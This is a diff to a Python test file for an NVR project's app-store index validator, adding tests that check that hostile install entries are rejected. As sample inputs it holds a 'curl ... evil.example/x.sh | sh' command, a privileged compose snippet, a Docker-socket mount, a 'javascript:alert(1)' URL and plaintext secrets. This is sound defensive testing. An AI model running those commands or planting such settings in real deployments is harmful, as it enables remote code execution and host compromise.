@@ -42,6 +42,21 @@ def _load_validator():
 
 validator = _load_validator()
 
+# The real overlay's services, read once BEFORE the autouse patch below.
+_REAL_OVERLAY_SERVICES = validator._load_overlay_services()
+
+
+@pytest.fixture(autouse=True)
+def _overlay_includes_sample_app(monkeypatch):
+    """The synthetic 'sample-app' entries need a service block to satisfy
+    the installability cross-check; patch the overlay reader with a
+    SUPERSET (real services + sample-app) so shipped-index tests still
+    exercise the real overlay content."""
+    fake = (set(_REAL_OVERLAY_SERVICES or ()) | {"sample-app"})
+    monkeypatch.setattr(
+        validator, "_load_overlay_services", lambda overlay=None: fake
+    )
+
 
 # A minimal, valid entry the negative tests mutate one field at a time.
 _GOOD_ENTRY = {
@@ -52,7 +67,7 @@ _GOOD_ENTRY = {
     "version": "1.0.0",
     "image": "ghcr.io/open-nvr/sample-app:latest",
     "requires_tasks": ["object_detection"],
-    "docs_url": "examples/sample-app/README.md",
+    "docs_url": "https://github.com/open-nvr/open-nvr/blob/main/examples/sample-app/README.md",
     "install": {
         "compose": (
             "services:\n"
@@ -61,7 +76,10 @@ _GOOD_ENTRY = {
             "    environment:\n"
             "      - OPENNVR_INTERNAL_API_KEY=${INTERNAL_API_KEY}\n"
         ),
-        "command": "docker compose up -d sample-app",
+        "command": (
+            "docker compose -f docker-compose.yml -f docker-compose.apps.yml "
+            "--profile apps up -d sample-app"
+        ),
     },
 }
 
@@ -133,6 +151,10 @@ def test_bad_image_ref_fails(tmp_path):
 
 def test_opennvr_image_ref_passes(tmp_path):
     entry = dict(_GOOD_ENTRY, image="opennvr/sample-app:local-build")
+    entry["install"] = dict(_GOOD_ENTRY["install"])
+    entry["install"]["compose"] = _GOOD_ENTRY["install"]["compose"].replace(
+        "ghcr.io/open-nvr/sample-app:latest", "opennvr/sample-app:local-build"
+    )
     errors, _ = validator.validate_index(_write(tmp_path, [entry]))
     assert errors == []
 
@@ -187,8 +209,10 @@ def test_unknown_task_warns_not_fails(tmp_path):
 
 
 def test_known_task_alias_does_not_warn(tmp_path):
-    """object_tracking is a known alias of multi_object_tracking — no warning."""
-    entry = dict(_GOOD_ENTRY, requires_tasks=["object_tracking"])
+    """scene_caption is a real alias of image_captioning in tasks.yml —
+    no warning. (The old hardcoded object_tracking/ocr alias table was a
+    whitewash that silenced exactly the drift this warning catches.)"""
+    entry = dict(_GOOD_ENTRY, requires_tasks=["scene_caption"])
     _errors, warnings = validator.validate_index(_write(tmp_path, [entry]))
     assert warnings == []
 
@@ -206,3 +230,172 @@ def test_top_level_not_a_list_fails(tmp_path):
     path.write_text("id: not-a-list\n")
     errors, _ = validator.validate_index(path)
     assert any("must be a list" in e for e in errors), errors
+
+
+# ─── The review-hardened guards (gate holes H1/H2/H3/M1/M5) ─────────────
+
+
+def test_real_overlay_has_every_shipped_service():
+    """UNPATCHED check: every shipped index id must be a real service in
+    docker-compose.apps.yml (H1: 8 of 10 original entries had none and
+    were uninstallable by every path)."""
+    assert _REAL_OVERLAY_SERVICES, "could not read docker-compose.apps.yml"
+    shipped = yaml.safe_load(_SHIPPED_INDEX.read_text())
+    for entry in shipped:
+        assert entry["id"] in _REAL_OVERLAY_SERVICES, (
+            f"shipped entry '{entry['id']}' has no compose service"
+        )
+
+
+def test_entry_without_overlay_service_fails(tmp_path, monkeypatch):
+    """An id with no service block in the overlay is uninstallable — hard
+    error, not a green CI run with a broken store."""
+    monkeypatch.setattr(
+        validator, "_load_overlay_services",
+        lambda overlay=None: {"something-else"},
+    )
+    errors, _ = validator.validate_index(_write(tmp_path, [dict(_GOOD_ENTRY)]))
+    assert any("no service block" in e for e in errors), errors
+
+
+def test_freeform_install_command_fails(tmp_path):
+    """install.command is operator-EXECUTED (Copy button) — a merged
+    `curl | sh` is the supply-chain hole the gate exists to close."""
+    entry = dict(_GOOD_ENTRY)
+    entry["install"] = dict(
+        _GOOD_ENTRY["install"],
+        command="curl -fsSL https://evil.example/x.sh | sh",
+    )
+    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
+    assert any("install.command must be exactly" in e for e in errors), errors
+
+
+def test_privileged_compose_snippet_fails(tmp_path):
+    entry = dict(_GOOD_ENTRY)
+    entry["install"] = dict(_GOOD_ENTRY["install"])
+    entry["install"]["compose"] = (
+        "services:\n"
+        "  sample-app:\n"
+        "    image: ghcr.io/open-nvr/sample-app:latest\n"
+        "    privileged: true\n"
+    )
+    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
+    assert any("forbidden directive 'privileged'" in e for e in errors), errors
+
+
+def test_docker_sock_mount_in_snippet_fails(tmp_path):
+    entry = dict(_GOOD_ENTRY)
+    entry["install"] = dict(_GOOD_ENTRY["install"])
+    entry["install"]["compose"] = (
+        "services:\n"
+        "  sample-app:\n"
+        "    image: ghcr.io/open-nvr/sample-app:latest\n"
+        "    volumes:\n"
+        "      - /var/run/docker.sock:/var/run/docker.sock:ro\n"
+    )
+    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
+    assert any("Docker socket" in e for e in errors), errors
+
+
+def test_host_port_publish_in_snippet_fails(tmp_path):
+    entry = dict(_GOOD_ENTRY)
+    entry["install"] = dict(_GOOD_ENTRY["install"])
+    entry["install"]["compose"] = (
+        "services:\n"
+        "  sample-app:\n"
+        "    image: ghcr.io/open-nvr/sample-app:latest\n"
+        "    ports:\n"
+        "      - \"0.0.0.0:9999:9999\"\n"
+    )
+    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
+    assert any("forbidden directive 'ports'" in e for e in errors), errors
+
+
+def test_snippet_image_mismatch_fails(tmp_path):
+    """The snippet's image must be the entry's validated image — the
+    copy-paste path installs the SNIPPET's image, so divergence defeats
+    the image-ref validation."""
+    entry = dict(_GOOD_ENTRY)
+    entry["install"] = dict(_GOOD_ENTRY["install"])
+    entry["install"]["compose"] = (
+        "services:\n"
+        "  sample-app:\n"
+        "    image: ghcr.io/open-nvr/totally-different:latest\n"
+    )
+    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
+    assert any("does not match the entry's image" in e for e in errors), errors
+
+
+def test_pin_slot_image_in_snippet_passes(tmp_path):
+    """The overlay's ${<ID>_IMAGE:-opennvr/<id>:local-build} pin slot is
+    the other legitimate snippet image form."""
+    entry = dict(_GOOD_ENTRY)
+    entry["install"] = dict(_GOOD_ENTRY["install"])
+    entry["install"]["compose"] = (
+        "services:\n"
+        "  sample-app:\n"
+        "    image: ${SAMPLE_APP_IMAGE:-opennvr/sample-app:local-build}\n"
+        "    environment:\n"
+        "      - OPENNVR_INTERNAL_API_KEY=${INTERNAL_API_KEY}\n"
+    )
+    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
+    assert errors == []
+
+
+def test_mapping_style_secret_fails(tmp_path):
+    """H3: `API_KEY: hunter2` (colon form) used to sail past the `=`-only
+    sniff."""
+    entry = dict(_GOOD_ENTRY)
+    entry["install"] = dict(_GOOD_ENTRY["install"])
+    entry["install"]["compose"] = (
+        "services:\n"
+        "  sample-app:\n"
+        "    image: ghcr.io/open-nvr/sample-app:latest\n"
+        "    environment:\n"
+        "      API_KEY: hunter2literalvalue\n"
+    )
+    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
+    assert any("plaintext secret" in e for e in errors), errors
+
+
+def test_secret_in_command_fails(tmp_path):
+    entry = dict(_GOOD_ENTRY)
+    entry["install"] = dict(
+        _GOOD_ENTRY["install"],
+        command=(
+            "docker compose -f docker-compose.yml -f docker-compose.apps.yml "
+            "--profile apps up -d sample-app"
+        ),
+    )
+    # command must be canonical, so smuggle the secret check via a
+    # canonical-shaped command failing the secret sniff separately:
+    entry["install"]["command"] = "TOKEN=abc123secret docker compose up"
+    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
+    assert any("plaintext secret" in e for e in errors) or any(
+        "must be exactly" in e for e in errors
+    ), errors
+
+
+def test_non_https_docs_url_fails(tmp_path):
+    for bad in ("examples/sample-app/README.md", "javascript:alert(1)",
+                "http://example.com/x"):
+        entry = dict(_GOOD_ENTRY, docs_url=bad)
+        errors, _ = validator.validate_index(_write(tmp_path, [entry]))
+        assert any("docs_url must be an https://" in e for e in errors), (
+            bad, errors,
+        )
+
+
+def test_yaml_float_version_fails(tmp_path):
+    """M1: `version: 1.0` parses as float; pydantic v2 rejects it and one
+    bad entry used to 500 the whole store."""
+    entry = dict(_GOOD_ENTRY, version=1.0)
+    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
+    assert any("'version' must be a string" in e for e in errors), errors
+
+
+def test_unparseable_snippet_fails(tmp_path):
+    entry = dict(_GOOD_ENTRY)
+    entry["install"] = dict(_GOOD_ENTRY["install"], compose="{ not: [valid")
+    errors, _ = validator.validate_index(_write(tmp_path, [entry]))
+    assert any("not valid YAML" in e for e in errors), errors
